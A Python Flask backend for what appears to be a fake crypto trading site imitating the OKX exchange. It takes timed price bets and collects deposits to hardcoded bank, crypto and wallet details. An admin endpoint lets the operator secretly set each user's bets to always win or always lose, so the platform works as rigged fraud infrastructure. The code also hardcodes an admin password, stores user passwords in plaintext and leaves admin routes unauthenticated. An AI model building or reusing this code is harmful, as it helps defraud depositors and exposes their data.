import os
from flask import Flask, send_from_directory, jsonify, request
from flask_socketio import SocketIO, emit
import sqlite3
import random
import threading
import time
import requests
from datetime import datetime, timedelta

# Change to the correct directory
os.chdir('/Users/nikitakurlov/okxсайт')

app = Flask(__name__, static_folder='.')
app.config['SECRET_KEY'] = 'your-secret-key'
socketio = SocketIO(app, cors_allowed_origins="*")

# CoinGecko API configuration
COINGECKO_API_URL = "https://api.coingecko.com/api/v3"
COINGECKO_COINS = {
    'BTCUSDT': 'bitcoin',
    'ETHUSDT': 'ethereum', 
    'SOLUSDT': 'solana',
    'XRPUSDT': 'ripple',
    'ADAUSDT': 'cardano',
    'DOGEUSDT': 'dogecoin',
    'TONUSDT': 'the-open-network',
    'DOTUSDT': 'polkadot',
    'MATICUSDT': 'matic-network',
    'SHIBUSDT': 'shiba-inu',
    'AVAXUSDT': 'avalanche-2',
    'TRXUSDT': 'tron',
    'LINKUSDT': 'chainlink',
    'ATOMUSDT': 'cosmos',
    'UNIUSDT': 'uniswap',
    'NEARUSDT': 'near',
    'APTUSDT': 'aptos',
    'OPUSDT': 'optimism',
    'INJUSDT': 'injective-protocol',
    'SUIUSDT': 'sui'
}

# Cache for coin prices
price_cache = {}
cache_timeout = 30  # seconds

def get_coin_prices():
    """Get current coin prices from CoinGecko API with caching"""
    current_time = time.time()
    
    # Check if cache is still valid
    if 'last_update' in price_cache and (current_time - price_cache['last_update']) < cache_timeout:
        return price_cache['prices']
    
    try:
        # Get all coin IDs
        coin_ids = list(COINGECKO_COINS.values())
        coin_ids_str = ','.join(coin_ids)
        
        # Make API request to CoinGecko
        url = f"{COINGECKO_API_URL}/simple/price"
        params = {
            'ids': coin_ids_str,
            'vs_currencies': 'usd',
            'include_24hr_change': 'true'
        }
        
        response = requests.get(url, params=params, timeout=10)
        response.raise_for_status()
        
        data = response.json()
        
        # Process the data to match our format
        prices = {}
        for symbol, coin_id in COINGECKO_COINS.items():
            if coin_id in data:
                coin_data = data[coin_id]
                price = coin_data.get('usd', 0)
                change_24h = coin_data.get('usd_24h_change', 0)
                
                prices[symbol] = {
                    'price': price,
                    'change_24h': change_24h,
                    'formatted_price': f"{price:,.2f}".replace(',', ' '),
                    'formatted_change': f"{change_24h:+.2f}%"
                }
        
        # Update cache
        price_cache['prices'] = prices
        price_cache['last_update'] = current_time
        
        return prices
        
    except Exception as e:
        print(f"Error fetching coin prices: {e}")
        # Return cached data if available, otherwise return empty dict
        return price_cache.get('prices', {})

# Serve static files
@app.route('/')
def serve_index():
    return send_from_directory('.', 'index.html')

@app.route('/login.html')
def serve_login():
    return send_from_directory('.', 'login.html')

@app.route('/admin.html')
def serve_admin():
    return send_from_directory('.', 'admin.html')

@app.route('/admin-payment-methods.html')
def serve_admin_payment_methods():
    return send_from_directory('.', 'admin-payment-methods.html')

@app.route('/user-details.html')
def serve_user_details():
    return send_from_directory('.', 'user-details.html')

@app.route('/<path:path>')
def serve_static(path):
    if path != "" and os.path.exists(os.path.join('.', path)):
        return send_from_directory('.', path)
    else:
        return send_from_directory('.', 'index.html')

# Initialize database
def init_db():
    conn = sqlite3.connect('backend/database.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  telegram_username TEXT UNIQUE,
                  email TEXT,
                  password TEXT,
                  balance REAL DEFAULT 0.0)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS bets
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  user_id INTEGER,
                  amount REAL,
                  direction TEXT,
                  time_minutes INTEGER,
                  status TEXT DEFAULT 'active',
                  result TEXT,
                  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                  FOREIGN KEY (user_id) REFERENCES users(id))''')
    
    # Add a table for user settings
    c.execute('''CREATE TABLE IF NOT EXISTS user_settings
                 (user_id INTEGER PRIMARY KEY,
                  bet_outcome TEXT DEFAULT 'random',
                  win_multiplier REAL DEFAULT 2.0,
                  FOREIGN KEY (user_id) REFERENCES users(id))''')
    
    # Add a table for payment methods
    c.execute('''CREATE TABLE IF NOT EXISTS payment_methods
                 (id TEXT PRIMARY KEY,
                  name TEXT,
                  details TEXT,
                  is_active INTEGER DEFAULT 1)''')
    
    # Add a table for deposit requests
    c.execute('''CREATE TABLE IF NOT EXISTS deposit_requests
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  user_id INTEGER,
                  amount REAL,
                  payment_method TEXT,
                  status TEXT DEFAULT 'pending',
                  created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                  FOREIGN KEY (user_id) REFERENCES users(id))''')
    
    # Insert default payment methods if they don't exist
    c.execute("INSERT OR IGNORE INTO payment_methods (id, name, details) VALUES (?, ?, ?)",
              ('bank', 'Банковский перевод', 'Номер счета: 40817810099910203040\nБИК: 044525225\nБанк: ПАО Сбербанк'))
    
    c.execute("INSERT OR IGNORE INTO payment_methods (id, name, details) VALUES (?, ?, ?)",
              ('crypto', 'Криптовалюта', 'BTC: bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq\nETH: 0x742d35Cc6634C0532925a3b8D91D0a6b3b3b3b3b'))
    
    c.execute("INSERT OR IGNORE INTO payment_methods (id, name, details) VALUES (?, ?, ?)",
              ('qiwi', 'Qiwi', 'Номер: +7 (999) 123-45-67'))
    
    c.execute("INSERT OR IGNORE INTO payment_methods (id, name, details) VALUES (?, ?, ?)",
              ('yoomoney', 'YooMoney', 'Кошелек: 410011234567890'))
    
    conn.commit()
    conn.close()

# Get user balance
def get_user_balance(telegram_username):
    conn = sqlite3.connect('backend/database.db')
    c = conn.cursor()
    c.execute("SELECT balance FROM users WHERE telegram_username = ?", (telegram_username,))
    result = c.fetchone()
    conn.close()
    return result[0] if result else 0.0

# Update user balance
def update_user_balance(telegram_username, amount):
    conn = sqlite3.connect('backend/database.db')
    c = conn.cursor()
    c.execute("UPDATE users SET balance = balance + ? WHERE telegram_username = ?", (amount, telegram_username))
    conn.commit()
    conn.close()
    
    # Emit balance update via WebSocket
    socketio.emit('balance_update', {
        'telegram_username': telegram_username,
        'balance': get_user_balance(telegram_username)
    })

# Register new user
@app.route('/api/register', methods=['POST'])
def register():
    data = request.get_json()
    telegram_username = data.get('telegram')
    email = data.get('email')
    password = data.get('password')
    
    try:
        conn = sqlite3.connect('backend/database.db')
        c = conn.cursor()
        c.execute("INSERT INTO users (telegram_username, email, password, balance) VALUES (?, ?, ?, ?)",
                  (telegram_username, email, password, 0.0))
        user_id = c.lastrowid
        # Create default settings for the user
        c.execute("INSERT OR IGNORE INTO user_settings (user_id, bet_outcome, win_multiplier) VALUES (?, ?, ?)",
                  (user_id, 'random', 2.0))
        conn.commit()
        conn.close()
        
        return jsonify({
            'success': True,
            'message': 'User registered successfully',
            'balance': 0.0
        })
    except sqlite3.IntegrityError:
        return jsonify({
            'success': False,
            'message': 'Telegram username already exists'
        }), 400
    except Exception as e:
        return jsonify({
            'success': False,
            'message': str(e)
        }), 500

# Login user
@app.route('/api/login', methods=['POST'])
def login():
    data = request.get_json()
    telegram_username = data.get('telegram')
    password = data.get('password')
    
    # Check for admin credentials
    if telegram_username == 'admin' and password == 'Zxcv1236':
        return jsonify({
            'success': True,
            'isAdmin': True
        })
    
    conn = sqlite3.connect('backend/database.db')
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE telegram_username = ? AND password = ?", 
              (telegram_username, password))
    user = c.fetchone()
    conn.close()
    
    if user:
        return jsonify({
            'success': True,
            'telegram': telegram_username,
            'balance': user[4],  # balance is the 5th column
            'isAdmin': False
        })
    else:
        return jsonify({
            'success': False,
            'message': 'Invalid credentials'
        }), 401

# Get user balance
@app.route('/api/balance/<telegram_username>', methods=['GET'])
def get_balance(telegram_username):
    balance = get_user_balance(telegram_username)
    return jsonify({
        'telegram_username': telegram_username,
        'balance': balance
    })

# Get coin prices from CoinGecko
@app.route('/api/coin-prices', methods=['GET'])
def get_coin_prices_endpoint():
    try:
        prices = get_coin_prices()
        return jsonify({
            'success': True,
            'prices': prices
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'message': str(e)
        }), 500

# Get user operations history
@app.route('/api/operations/<telegram_username>', methods=['GET'])
def get_user_operations(telegram_username):
    try:
        conn = sqlite3.connect('backend/database.db')
        c = conn.cursor()
        
        # Get user ID
        c.execute("SELECT id FROM users WHERE telegram_username = ?", (telegram_username,))
        user = c.fetchone()
        
        if not user:
            return jsonify({
                'success': False,
                'message': 'User not found'
            }), 404
        
        user_id = user[0]
        
        # Get all bets for the user
        c.execute("""SELECT id, amount, direction, time_minutes, status, result, reward, timestamp, completed_at 
                     FROM bets WHERE user_id = ? 
                     ORDER BY timestamp DESC LIMIT 50""", (user_id,))
        bets = c.fetchall()
        
        # Get all deposit requests for the user
        c.execute("""SELECT dr.id, dr.amount, dr.payment_method, dr.status, dr.created_at, pm.name as payment_name
                     FROM deposit_requests dr 
                     LEFT JOIN payment_methods pm ON dr.payment_method = pm.id
                     WHERE dr.user_id = ? 
                     ORDER BY dr.created_at DESC LIMIT 20""", (user_id,))
        deposits = c.fetchall()
        
        conn.close()
        
        # Format operations
        operations = []
        
        # Add bets
        for bet in bets:
            bet_id, amount, direction, time_minutes, status, result, reward, timestamp, completed_at = bet
            
            operation = {
                'id': f"bet_{bet_id}",
                'type': 'bet',
                'amount': amount,
                'direction': direction,
                'time_minutes': time_minutes,
                'status': status,
                'result': result,
                'reward': reward,
                'timestamp': timestamp,
                'completed_at': completed_at,
                'description': f"Ставка {direction} на {amount} USDT на {time_minutes} мин"
            }
            operations.append(operation)
        
        # Add deposits
        for deposit in deposits:
            dep_id, amount, payment_method, status, created_at, payment_name = deposit
            
            operation = {
                'id': f"deposit_{dep_id}",
                'type': 'deposit',
                'amount': amount,
                'payment_method': payment_method,
                'payment_name': payment_name or 'Неизвестный метод',
                'status': status,
                'timestamp': created_at,
                'description': f"Пополнение {amount} USDT через {payment_name or payment_method}"
            }
            operations.append(operation)
        
        # Sort by timestamp (newest first)
        operations.sort(key=lambda x: x['timestamp'], reverse=True)
        
        return jsonify({
            'success': True,
            'operations': operations
        })
        
    except Exception as e:
        return jsonify({
            'success': False,
            'message': str(e)
        }), 500

# Place a bet
@app.route('/api/bet', methods=['POST'])
def place_bet():
    data = request.get_json()
    telegram_username = data.get('telegram')
    amount = float(data.get('amount'))
    direction = data.get('direction')
    time_minutes = int(data.get('time'))
    
    # Check if user has sufficient balance
    current_balance = get_user_balance(telegram_username)
    if current_balance < amount:
        return jsonify({
            'success': False,
            'message': 'Insufficient balance'
        }), 400
    
    # Deduct bet amount from user balance
    update_user_balance(telegram_username, -amount)
    
    # Save bet to database
    conn = sqlite3.connect('backend/database.db')
    c = conn.cursor()
    c.execute("SELECT id FROM users WHERE telegram_username = ?", (telegram_username,))
    user_id = c.fetchone()[0]
    
    c.execute("INSERT INTO bets (user_id, amount, direction, time_minutes) VALUES (?, ?, ?, ?)",
              (user_id, amount, direction, time_minutes))
    conn.commit()
    conn.close()
    
    return jsonify({
        'success': True,
        'message': 'Bet placed successfully',
        'new_balance': get_user_balance(telegram_username)
    })

# Complete bet endpoint
@app.route('/api/complete-bet', methods=['POST'])
def complete_bet():
    data = request.get_json()
    telegram_username = data.get('telegram')
    trade_id = data.get('trade_id')
    symbol = data.get('symbol')
    direction = data.get('direction')
    amount = float(data.get('amount'))
    time_minutes = int(data.get('time'))
    
    try:
        conn = sqlite3.connect('backend/database.db')
        c = conn.cursor()
        
        # Get user ID
        c.execute("SELECT id FROM users WHERE telegram_username = ?", (telegram_username,))
        user = c.fetchone()
        
        if not user:
            return jsonify({
                'success': False,
                'message': 'User not found'
            }), 404
        
        user_id = user[0]
        
        # Check user settings for bet outcome
        c.execute("SELECT bet_outcome, win_multiplier FROM user_settings WHERE user_id = ?", (user_id,))
        settings = c.fetchone()
        
        if settings:
            bet_outcome, win_multiplier = settings
        else:
            # Default settings
            bet_outcome = 'random'
            win_multiplier = 2.0
        
        # Determine if user wins based on settings
        if bet_outcome == 'win':
            won = True
        elif bet_outcome == 'lose':
            won = False
        else:  # random
            won = random.choice([True, False])
        
        if won:
            # User wins - add winnings based on multiplier
            total_return = amount * win_multiplier
            c.execute("UPDATE users SET balance = balance + ? WHERE id = ?", (total_return, user_id))
            result = 'win'
            reward = total_return - amount  # Net profit
        else:
            # User loses - amount is already deducted
            result = 'loss'
            reward = 0
        
        # Update bet status in database (if exists)
        c.execute("SELECT id FROM bets WHERE user_id = ? AND amount = ? AND direction = ? AND time_minutes = ? AND status = 'active'", 
                  (user_id, amount, direction, time_minutes))
        bet = c.fetchone()
        
        if bet:
            c.execute("UPDATE bets SET status = 'completed', result = ? WHERE id = ?", (result, bet[0]))
        
        conn.commit()
        conn.close()
        
        # Get updated balance
        new_balance = get_user_balance(telegram_username)
        
        return jsonify({
            'success': True,
            'result': result,
            'reward': reward,
            'new_balance': new_balance
        })
        
    except Exception as e:
        return jsonify({
            'success': False,
            'message': str(e)
        }), 500

# Get all users for admin panel
@app.route('/api/admin/users', methods=['GET'])
def get_all_users():
    try:
        conn = sqlite3.connect('backend/database.db')
        # Enable row factory to get column names
        conn.row_factory = sqlite3.Row
        c = conn.cursor()
        c.execute("SELECT id, telegram_username, email, balance FROM users ORDER BY id DESC")
        users = c.fetchall()
        conn.close()
        
        # Convert to list of dictionaries
        users_list = []
        for user in users:
            user_dict = dict(user)
            user_dict['registration_date'] = 'N/A'
            users_list.append(user_dict)
        
        return jsonify({
            'success': True,
            'users': users_list
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'message': str(e)
        }), 500

# Get user details for admin panel
@app.route('/api/admin/user/<int:user_id>', methods=['GET'])
def get_user_details(user_id):
    try:
        conn = sqlite3.connect('backend/database.db')
        # Enable row factory to get column names
        conn.row_factory = sqlite3.Row
        c = conn.cursor()
        
        # Get user details
        c.execute("SELECT id, telegram_username, email, balance FROM users WHERE id = ?", (user_id,))
        user = c.fetchone()
        
        if not user:
            return jsonify({
                'success': False,
                'message': 'User not found'
            }), 404
        
        # Get user settings
        c.execute("SELECT bet_outcome, win_multiplier FROM user_settings WHERE user_id = ?", (user_id,))
        settings = c.fetchone()
        
        conn.close()
        
        # Convert to dictionary
        user_dict = dict(user)
        if settings:
            user_dict.update(dict(settings))
        else:
            # Default settings
            user_dict['bet_outcome'] = 'random'
            user_dict['win_multiplier'] = 2.0
        
        return jsonify({
            'success': True,
            'user': user_dict
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'message': str(e)
        }), 500

# Update user balance
@app.route('/api/admin/user/<int:user_id>/balance', methods=['POST'])
def update_user_balance_admin(user_id):
    try:
        data = request.get_json()
        amount = float(data.get('amount'))
        reason = data.get('reason', 'manual')
        
        conn = sqlite3.connect('backend/database.db')
        c = conn.cursor()
        
        # Get user telegram username
        c.execute("SELECT telegram_username, balance FROM users WHERE id = ?", (user_id,))
        user = c.fetchone()
        
        if not user:
            return jsonify({
                'success': False,
                'message': 'User not found'
            }), 404
        
        telegram_username, current_balance = user
        
        # Update user balance
        new_balance = current_balance + amount
        c.execute("UPDATE users SET balance = ? WHERE id = ?", (new_balance, user_id))
        conn.commit()
        conn.close()
        
        # Emit balance update via WebSocket
        socketio.emit('balance_update', {
            'telegram_username': telegram_username,
            'balance': new_balance
        })
        
        return jsonify({
            'success': True,
            'message': 'User balance updated successfully',
            'new_balance': new_balance
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'message': str(e)
        }), 500

# Update user settings
@app.route('/api/admin/user/<int:user_id>/settings', methods=['POST'])
def update_user_settings(user_id):
    try:
        data = request.get_json()
        bet_outcome = data.get('bet_outcome', 'random')
        win_multiplier = float(data.get('win_multiplier', 2.0))
        
        conn = sqlite3.connect('backend/database.db')
        c = conn.cursor()
        
        # Check if user exists
        c.execute("SELECT id FROM users WHERE id = ?", (user_id,))
        user = c.fetchone()
        
        if not user:
            return jsonify({
                'success': False,
                'message': 'User not found'
            }), 404
        
        # Update or insert user settings
        c.execute("INSERT OR REPLACE INTO user_settings (user_id, bet_outcome, win_multiplier) VALUES (?, ?, ?)",
                  (user_id, bet_outcome, win_multiplier))
        conn.commit()
        conn.close()
        
        return jsonify({
            'success': True,
            'message': 'User settings updated successfully'
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'message': str(e)
        }), 500

# Get all payment methods
@app.route('/api/payment-methods', methods=['GET'])
def get_payment_methods():
    try:
        conn = sqlite3.connect('backend/database.db')
        # Enable row factory to get column names
        conn.row_factory = sqlite3.Row
        c = conn.cursor()
        c.execute("SELECT id, name, details, is_active FROM payment_methods WHERE is_active = 1")
        methods = c.fetchall()
        conn.close()
        
        # Convert to list of dictionaries
        methods_list = [dict(method) for method in methods]
        
        return jsonify({
            'success': True,
            'methods': methods_list
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'message': str(e)
        }), 500

# Get payment method details
@app.route('/api/payment-methods/<method_id>', methods=['GET'])
def get_payment_method_details(method_id):
    try:
        conn = sqlite3.connect('backend/database.db')
        # Enable row factory to get column names
        conn.row_factory = sqlite3.Row
        c = conn.cursor()
        c.execute("SELECT id, name, details FROM payment_methods WHERE id = ?", (method_id,))
        method = c.fetchone()
        conn.close()
        
        if not method:
            return jsonify({
                'success': False,
                'message': 'Payment method not found'
            }), 404
        
        return jsonify({
            'success': True,
            'method': dict(method)
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'message': str(e)
        }), 500

# Admin: Get all payment methods (including inactive)
@app.route('/api/admin/payment-methods', methods=['GET'])
def admin_get_payment_methods():
    try:
        conn = sqlite3.connect('backend/database.db')
        # Enable row factory to get column names
        conn.row_factory = sqlite3.Row
        c = conn.cursor()
        c.execute("SELECT id, name, details, is_active FROM payment_methods")
        methods = c.fetchall()
        conn.close()
        
        # Convert to list of dictionaries
        methods_list = [dict(method) for method in methods]
        
        return jsonify({
            'success': True,
            'methods': methods_list
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'message': str(e)
        }), 500

# Admin: Update payment method
@app.route('/api/admin/payment-methods/<method_id>', methods=['POST'])
def admin_update_payment_method(method_id):
    try:
        data = request.get_json()
        name = data.get('name')
        details = data.get('details')
        is_active = data.get('is_active', 1)
        
        conn = sqlite3.connect('backend/database.db')
        c = conn.cursor()
        c.execute("UPDATE payment_methods SET name = ?, details = ?, is_active = ? WHERE id = ?",
                  (name, details, is_active, method_id))
        conn.commit()
        conn.close()
        
        return jsonify({
            'success': True,
            'message': 'Payment method updated successfully'
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'message': str(e)
        }), 500

# Create deposit request
@app.route('/api/deposit', methods=['POST'])
def create_deposit_request():
    try:
        data = request.get_json()
        telegram_username = data.get('telegram')
        amount = float(data.get('amount'))
        payment_method = data.get('payment_method')
        
        conn = sqlite3.connect('backend/database.db')
        c = conn.cursor()
        
        # Get user ID
        c.execute("SELECT id FROM users WHERE telegram_username = ?", (telegram_username,))
        user = c.fetchone()
        
        if not user:
            return jsonify({
                'success': False,
                'message': 'User not found'
            }), 404
        
        user_id = user[0]
        
        # Create deposit request
        c.execute("INSERT INTO deposit_requests (user_id, amount, payment_method) VALUES (?, ?, ?)",
                  (user_id, amount, payment_method))
        deposit_id = c.lastrowid
        conn.commit()
        conn.close()
        
        # In a real implementation, you would notify the admin about the new deposit request
        print(f"New deposit request #{deposit_id} for user {telegram_username}: {amount} USDT via {payment_method}")
        
        return jsonify({
            'success': True,
            'message': 'Deposit request created successfully',
            'deposit_id': deposit_id
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'message': str(e)
        }), 500

# Admin: Get pending deposit requests
@app.route('/api/admin/deposit-requests', methods=['GET'])
def admin_get_deposit_requests():
    try:
        conn = sqlite3.connect('backend/database.db')
        # Enable row factory to get column names
        conn.row_factory = sqlite3.Row
        c = conn.cursor()
        c.execute("""SELECT dr.id, dr.amount, dr.payment_method, dr.status, dr.created_at, u.telegram_username 
                     FROM deposit_requests dr 
                     JOIN users u ON dr.user_id = u.id 
                     WHERE dr.status = 'pending' 
                     ORDER BY dr.created_at DESC""")
        requests = c.fetchall()
        conn.close()
        
        # Convert to list of dictionaries
        requests_list = [dict(request) for request in requests]
        
        return jsonify({
            'success': True,
            'requests': requests_list
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'message': str(e)
        }), 500

# Admin: Process deposit request
@app.route('/api/admin/deposit-requests/<int:request_id>/<action>', methods=['POST'])
def admin_process_deposit_request(request_id, action):
    try:
        if action not in ['approve', 'reject']:
            return jsonify({
                'success': False,
                'message': 'Invalid action'
            }), 400
        
        conn = sqlite3.connect('backend/database.db')
        c = conn.cursor()
        
        if action == 'approve':
            # Get deposit request details
            c.execute("""SELECT dr.amount, u.telegram_username 
                         FROM deposit_requests dr 
                         JOIN users u ON dr.user_id = u.id 
                         WHERE dr.id = ?""", (request_id,))
            request_data = c.fetchone()
            
            if not request_data:
                return jsonify({
                    'success': False,
                    'message': 'Deposit request not found'
                }), 404
            
            amount, telegram_username = request_data
            
            # Update user balance
            c.execute("UPDATE users SET balance = balance + ? WHERE telegram_username = ?", (amount, telegram_username))
            
            # Update deposit request status
            c.execute("UPDATE deposit_requests SET status = 'approved' WHERE id = ?", (request_id,))
            
            # Emit balance update via WebSocket
            socketio.emit('balance_update', {
                'telegram_username': telegram_username,
                'balance': get_user_balance(telegram_username)
            })
            
            message = 'Deposit request approved and balance updated'
        else:  # reject
            c.execute("UPDATE deposit_requests SET status = 'rejected' WHERE id = ?", (request_id,))
            message = 'Deposit request rejected'
        
        conn.commit()
        conn.close()
        
        return jsonify({
            'success': True,
            'message': message
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'message': str(e)
        }), 500

# WebSocket connection
@socketio.on('connect')
def handle_connect():
    print('Client connected')

@socketio.on('disconnect')
def handle_disconnect():
    print('Client disconnected')

# WebSocket event for balance updates
@socketio.on('request_balance')
def handle_balance_request(data):
    telegram_username = data.get('telegram_username')
    balance = get_user_balance(telegram_username)
    emit('balance_update', {
        'telegram_username': telegram_username,
        'balance': balance
    })

# Function to simulate bet results
def simulate_bet_results():
    """Simulate bet results and update user balances accordingly"""
    with app.app_context():
        while True:
            try:
                conn = sqlite3.connect('backend/database.db')
                c = conn.cursor()
                
                # Get all active bets
                c.execute("SELECT b.id, b.user_id, b.amount, b.direction, b.time_minutes, u.telegram_username FROM bets b JOIN users u ON b.user_id = u.id WHERE b.status = 'active'")
                active_bets = c.fetchall()
                
                for bet in active_bets:
                    bet_id, user_id, amount, direction, time_minutes, telegram_username = bet
                    
                    # Check if bet time has expired
                    c.execute("SELECT timestamp FROM bets WHERE id = ?", (bet_id,))
                    timestamp_str = c.fetchone()[0]
                    bet_time = datetime.strptime(timestamp_str, "%Y-%m-%d %H:%M:%S")
                    
                    # If bet is older than its time limit, resolve it
                    if datetime.now() > bet_time + timedelta(minutes=time_minutes):
                        # Check user settings for bet outcome
                        c.execute("SELECT bet_outcome, win_multiplier FROM user_settings WHERE user_id = ?", (user_id,))
                        settings = c.fetchone()
                        
                        if settings:
                            bet_outcome, win_multiplier = settings
                        else:
                            # Default settings
                            bet_outcome = 'random'
                            win_multiplier = 2.0
                        
                        # Determine if user wins based on settings
                        if bet_outcome == 'win':
                            won = True
                        elif bet_outcome == 'lose':
                            won = False
                        else:  # random
                            won = random.choice([True, False])
                        
                        if won:
                            # User wins - add winnings based on multiplier
                            # Total return = original amount + (original amount * (multiplier - 1))
                            total_return = amount * win_multiplier
                            c.execute("UPDATE users SET balance = balance + ? WHERE id = ?", (total_return, user_id))
                            c.execute("UPDATE bets SET status = 'completed', result = 'win' WHERE id = ?", (bet_id,))
                            print(f"User {telegram_username} won {total_return} on bet {bet_id} (bet: {amount}, multiplier: {win_multiplier})")
                            
                            # Emit balance update via WebSocket
                            socketio.emit('balance_update', {
                                'telegram_username': telegram_username,
                                'balance': get_user_balance(telegram_username)
                            })
                        else:
                            # User loses - amount is already deducted (no additional loss)
                            c.execute("UPDATE bets SET status = 'completed', result = 'loss' WHERE id = ?", (bet_id,))
                            print(f"User {telegram_username} lost bet {bet_id} (bet: {amount})")
                
                conn.commit()
                conn.close()
                
                # Wait 30 seconds before checking again
                time.sleep(30)
            except Exception as e:
                print(f"Error in bet simulation: {e}")
                time.sleep(30)

if __name__ == '__main__':
    init_db()
    
    # Start bet simulation in a separate thread
    simulation_thread = threading.Thread(target=simulate_bet_results)
    simulation_thread.daemon = True
    simulation_thread.start()
    
    socketio.run(app, host='localhost', port=5000, debug=True)